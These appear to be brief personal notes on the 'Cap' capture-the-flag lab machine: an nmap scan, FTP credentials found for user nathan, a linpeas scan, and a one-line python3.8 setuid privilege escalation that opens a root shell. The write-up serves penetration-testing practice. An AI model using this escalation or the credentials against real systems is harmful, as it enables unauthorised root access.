Let's do the default steps:
`nmap 10.10.10.245  -Pn -A` and add `10.10.10.245 cap.htb` to `/etc/hosts`




![[Pasted image 20250428185603.png]]
![[Pasted image 20250428185615.png]]

`PASS Buck3tH4TF0RM3!` 
`USER nathan`

There a thing called `linpeash.sh` we run to scan the whole machine for any vulnerabilities. It gives a bunch of CVEs.
One peculiar thing is the `python3.8` executable has it's setUID bit set! So we can run this program as `root` user and get the shell!

`python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'`



